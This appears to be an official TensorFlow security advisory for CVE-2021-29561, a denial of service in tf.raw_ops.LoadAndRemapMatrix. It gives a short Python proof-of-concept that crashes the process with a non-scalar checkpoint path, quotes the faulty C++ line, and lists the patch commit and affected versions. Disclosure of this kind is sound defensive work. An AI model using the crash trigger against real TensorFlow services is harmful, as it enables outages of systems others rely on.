<h2>TFSA-2021-049: <code>CHECK</code>-fail in <code>LoadAndRemapMatrix</code></h2>
<h3>CVE Number</h3>
<p>CVE-2021-29561</p>
<h3>Impact</h3>
<p>An attacker can cause a denial of service by exploiting a <code>CHECK</code>-failure coming
from <code>tf.raw_ops.LoadAndRemapMatrix</code>:</p>
<p>```python
import tensorflow as tf</p>
<p>ckpt_path = tf.constant([], shape=[0], dtype=tf.string)
old_tensor_name = tf.constant("")
row_remapping = tf.constant([], shape=[0], dtype=tf.int64)
col_remapping = tf.constant([1], shape=[1], dtype=tf.int64)
initializing_values = tf.constant(1.0)</p>
<p>tf.raw_ops.LoadAndRemapMatrix(
    ckpt_path=ckpt_path, old_tensor_name=old_tensor_name,
    row_remapping=row_remapping, col_remapping=col_remapping,
    initializing_values=initializing_values, num_rows=0, num_cols=1)
```</p>
<p>This is because the
<a href="https://github.com/tensorflow/tensorflow/blob/d94227d43aa125ad8b54115c03cece54f6a1977b/tensorflow/core/kernels/ragged_tensor_to_tensor_op.cc#L219-L222">implementation</a>
assumes that the <code>ckpt_path</code> is always a valid scalar.</p>
<p><code>cc
const string&amp; ckpt_path = ckpt_path_t-&gt;scalar&lt;tstring&gt;()();</code></p>
<p>However, an attacker can send any other tensor as the first argument of
<code>LoadAndRemapMatrix</code>. This would cause the rank <code>CHECK</code> in <code>scalar&lt;T&gt;()()</code> to
trigger and terminate the process.</p>
<h3>Patches</h3>
<p>We have patched the issue in GitHub commit
<a href="https://github.com/tensorflow/tensorflow/commit/77dd114513d7796e1e2b8aece214a380af26fbf4">77dd114513d7796e1e2b8aece214a380af26fbf4</a>.</p>
<p>The fix will be included in TensorFlow 2.5.0. We will also cherrypick this
commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow
2.1.4, as these are also affected and still in supported range.</p>
<h3>For more information</h3>
<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security
guide</a> for
more information regarding the security model and how to contact us with issues
and questions.</p>
<h3>Attribution</h3>
<p>This vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu
X-Team.</p>